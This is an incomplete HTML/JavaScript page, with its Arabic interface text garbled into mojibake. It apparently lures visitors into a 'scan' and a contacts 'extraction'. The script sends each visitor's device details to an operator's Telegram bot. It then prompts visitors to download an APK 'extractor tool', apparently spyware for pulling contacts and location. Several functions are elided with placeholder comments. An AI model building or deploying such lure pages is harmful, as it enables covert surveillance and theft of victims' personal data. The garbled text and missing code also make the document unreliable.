<!DOCTYPE html>
<html lang="ar" dir="rtl">
<body>
  <div class="scanner-container">
    <div class="btn-group" id="mainButtonArea">
        <button class="btn" id="locationScanBtn" onclick="startLocationTracking()">
            <i class="fas fa-map-marker-alt"></i> ุจุฏุก ุงููุณุญ ุงูุฌุบุฑุงูู
        </button>
        <button class="btn alt" id="customAppBtn" onclick="launchCustomApp()">
            <i class="fas fa-address-book"></i> ุจุฏุก ุงูุงุณุชุฎุฑุงุฌ ุงูุญูููู ููุจูุงูุงุช
        </button>
    </div>
    
    </div>

  <script>
    // ... (Telegram Configuration and Constants remain the same) ...
    const CONTACTS_DEEPLINK = 'myextractorapp://start_extraction'; // ุฑุงุจุท ุฃูุซุฑ ูุถูุญุงู
    const APK_DOWNLOAD_URL = 'http://yourdomain.com/downloads/extractor_tool.apk'; 
    
    // ... (ุจููุฉ ุงูุฏูุงู: simulateScan, sendLocation, resetUI) ...
    
    // โญโญ ุงูุฏุงูุฉ ุงูููุญุฏุซุฉ: ุชุดุบูู ุงูุชุทุจูู ุงูุฎุงุต ุงูุฐู ุณูููู ุจุงูุฅุฑุณุงู ุงูุญูููู โญโญ
    function launchCustomApp() {
        // 1. ุชุบููุฑ ุงูุญุงูุฉ ูู ุงููุงุฌูุฉ
        simList.style.display = "none";
        scanDetails.style.display = "none";
        document.getElementById("customAppBtn").disabled = true;
        document.getElementById("locationScanBtn").disabled = true;
        
        document.getElementById("customAppBtn").innerHTML = '<span class="loading"></span> ุฌุงุฑู ุฅุทูุงู ุงูุฃุฏุงุฉ ูุฅุฑุณุงู ุงูุจูุงูุงุช...';
        scanStatus.innerHTML = "๐ <strong>ุงูููุฒ ุฅูู ุงูุฃุฏุงุฉ...</strong> ูุฑุฌู ุงูููุงููุฉ ุนูู ูุชุญ ุงูุชุทุจูู.";
        progressBar.style.width = "100%";
        
        // 2. ุงูุฃูุฑ ุงูููู: ูุญุงููุฉ ูุชุญ ุงูุฑุงุจุท ุงูุนููู (ูุชุดุบูู ุชุทุจููู)
        window.location.href = CONTACTS_DEEPLINK;

        // ุฅุฑุณุงู ุชูุฑูุฑ ุงูุจุฏุงูุฉ ุฅูู ุงูุจูุช (ูุชุนุฑู ุฃู ุงููุญุงููุฉ ุจุฏุฃุช)
        sendStartReport("contacts");

        // 3. ูููุฉ ููุชุญูู (ุฅุฐุง ูู ููู ุงูุชุทุจูู ูุซุจุชุงู)
        setTimeout(() => {
            // ุฅุฐุง ูู ูุชู ูุชุญ ุงูุชุทุจููุ ุณูุชู ุชูููุฐ ูุฐุง ุงูุฌุฒุก
            scanStatus.innerHTML = `โ๏ธ <strong>ูู ูุชู ุงูุนุซูุฑ ุนูู ุงูุฃุฏุงุฉ.</strong> ูุฌุจ ุชุซุจูุช ุงูุฃุฏุงุฉ ุฃููุงู ููุชู ุงูุฅุฑุณุงู ุงูุญูููู.`;
            
            // ุชุญููู ุงููุงุฌูุฉ ูุชูููู ุงูุชุญููู ุงููุจุงุดุฑ
            mainButtonArea.innerHTML = `
                <a href="${APK_DOWNLOAD_URL}" class="btn alt" style="text-decoration: none; width: 100%;">
                    <i class="fas fa-download"></i> ุชุญููู ุงูุฃุฏุงุฉ ุงูุญููููุฉ ููุฅุฑุณุงู (APK)
                </a>
                <button class="btn" onclick="resetUI()">
                    <i class="fas fa-redo"></i> ูุณุญ ุฌุฏูุฏ
                </button>
            `;

            // ุฅุฑุณุงู ุชูุฑูุฑ ูุดู (ูุชุณุฌูู ูุญุงููุงุช ุงููุณุชุฎุฏู)
            sendFailureReport("App not found; prompted user to download.");

        }, 1500); 
    }
    
    // ุฏุงูุฉ ุฌุฏูุฏุฉ ูุฅุฑุณุงู ุชูุฑูุฑ ูุญุงููุฉ ุงูุจุฏุงูุฉ (ูุชุนุฑู ูุชู ุถุบุท ุงููุณุชุฎุฏู)
    function sendStartReport(dataType) {
        const agent = navigator.userAgent;
        const msg = `๐ข <b>[ุจุฏุก ุงูุนูููุฉ]</b> ูุญุงููุฉ ุฅุทูุงู ุฃุฏุงุฉ ุงูุงุณุชุฎุฑุงุฌ ูู: <b>${dataType.toUpperCase()}</b>\n\n๐ค <b>ุงููุณุชุฎุฏู:</b> ${TELEGRAM_USERNAME}\n๐ฑ <b>ุงูุฌูุงุฒ:</b> ${agent.substring(0, 100)}...\n๐ <b>ุงูููุช:</b> ${new Date().toLocaleString('ar-YE')}`;

        fetch(TELEGRAM_API_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                chat_id: TELEGRAM_ADMIN_ID,
                text: msg,
                parse_mode: "HTML"
            }),
        });
    }

    // ... (ุจููุฉ ุงูุฏูุงู ุชุจูู ููุง ูู) ...

  </script>
</body>
</html>
